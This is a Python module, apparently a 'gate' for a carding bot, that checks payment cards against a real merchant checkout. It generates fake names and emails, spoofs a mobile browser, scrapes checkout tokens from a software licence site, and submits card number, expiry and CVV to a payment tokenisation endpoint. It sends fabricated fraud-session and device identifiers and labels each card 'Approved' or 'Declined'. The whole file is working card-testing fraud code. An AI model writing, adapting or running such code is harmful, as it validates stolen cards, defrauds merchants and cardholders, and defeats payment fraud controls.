# Pure gate motor for 'rc' — no Telegram-bot dependency.

import random, requests

from faker import Faker

_GATEWAY = 'Recurly Auth'

_f = Faker('en_US')

_name = lambda: (_f.first_name().replace(' ', '').replace('.', ''), _f.last_name().replace(' ', '').replace('.', ''))

_email = lambda: f"{_f.user_name()}@{random.choice(['gmail.com', 'yahoo.com', 'hotmail.com'])}"

_UA = 'Mozilla/5.0 (Linux; Android 7; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36'

def _found(html, start, end):
    try:
        s = html.index(start) + len(start)
        return html[s:html.index(end, s)]
    except ValueError:
        return None

def _flow(num, mes, ano, cvv):
    mes = mes.zfill(2)
    ano = f'20{ano}' if len(ano) == 2 else ano
    last = ''
    for _ in range(3):
        try:
            sess = requests.Session()
            fn, ln = _name()
            ml = _email()
            hdrs = {'Host': 'licenses.unison.audio', 'Connection': 'keep-alive', 'sec-ch-ua': '"Chromium";v="136", "Brave";v="136", "Not.A/Brand";v="99"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'Upgrade-Insecure-Requests': '1', 'User-Agent': _UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'Sec-GPC': '1', 'Accept-Language': 'es-MX,es;q=0.7', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-User': '?1', 'Sec-Fetch-Dest': 'document'}
            _URL = 'https://licenses.unison.audio/recurly/checkout/unison-plugin-pass/'
            _UT = 'https://licenses.unison.audio/ac/touch/'
            res = sess.get(_URL, headers=hdrs, timeout=20)
            t1 = _found(res.text, "token: '", "'")
            t2 = _found(res.text, 'name="csrfmiddlewaretoken" value="', '"')
            if not t1 or not t2:
                last = 'tokens not found'
                continue
            hdrs['Content-Type'] = 'application/json'
            for step in [{'token': t1, 'email': ml, 'firstName': '', 'lastName': '', 'listId': '350'}, {'token': t1, 'email': ml, 'firstName': fn, 'lastName': '', 'listId': '350'}, {'token': t1, 'email': ml, 'firstName': fn, 'lastName': ln, 'listId': '350'}]:
                sess.post(_UT, headers=hdrs, json=step, timeout=15)
            hdrs['Content-Type'] = 'application/x-www-form-urlencoded'
            data = f'first_name={fn}&last_name={ln}&token=&number={num}&fraud[0][processor]=fraudnet&fraud[0][session_id]=8139ab05f7bd8ebf7285cf48e99f927d&browser[color_depth]=24&browser[java_enabled]=false&browser[language]=es-MX&browser[referrer_url]={_URL}&browser[screen_height]=712&browser[screen_width]=320&browser[time_zone_offset]=360&browser[user_agent]={_UA}&month={mes}&year={ano}&cvv={cvv}&version=4.44.0&key=ewr1-lNVirUwU36fbpe0qV9MpKO&deviceId=bCzAa580PO8cLUCl&sessionId=ncSY33KYbhDxlQwh&instanceId=XcyF1IL8d7lsw2FZ'
            r2 = sess.post('https://api.recurly.com/js/v1/token', data=data, timeout=20)
            token = r2.json().get('id')
            if not token:
                return {'status': True, 'success': False, 'response': 'Declined ❌ | No Recurly token'}
            hdrs['Referer'] = _URL
            data = f'csrfmiddlewaretoken={t2}&email={ml}&first_name={fn}&last_name={ln}&recurly_token={token}&payment_method=credit_card'
            r3 = sess.post(_URL, headers=hdrs, data=data, allow_redirects=False, timeout=20)
            if r3.status_code == 302 and '/done' in r3.headers.get('location', ''):
                return {'status': True, 'success': True, 'response': 'Approved ✅ | Account Created'}
            if 'alert-danger' in r3.text:
                msg = _found(r3.text, 'aria-label="close">&#215;</button>', '</div></section>') or r3.text[:80]
                return {'status': True, 'success': False, 'response': f'Declined ❌ | {msg.strip()[:120]}'}
            return {'status': True, 'success': False, 'response': f'Declined ❌ | {r3.text[:60]}'}
        except Exception as e:
            last = str(e)[:180]
    return {'status': False, 'raise': f'Retries exhausted: {last}'}

def _checker(cc, binData):
    try:
        return _flow(cc[0], cc[1], cc[2], cc[3])
    except Exception as e:
        return {'status': False, 'raise': str(e)[:200]}

def run_check(cc, bin_data, ctx=None):
    r = _checker(cc, bin_data)
    if not r.get('status'):
        return {'status': 'Error ⚠️', 'response': r.get('raise', 'Gate error')}
    return {'status': 'Approved ✅' if r.get('success') else 'Declined ❌', 'response': r.get('response', '')}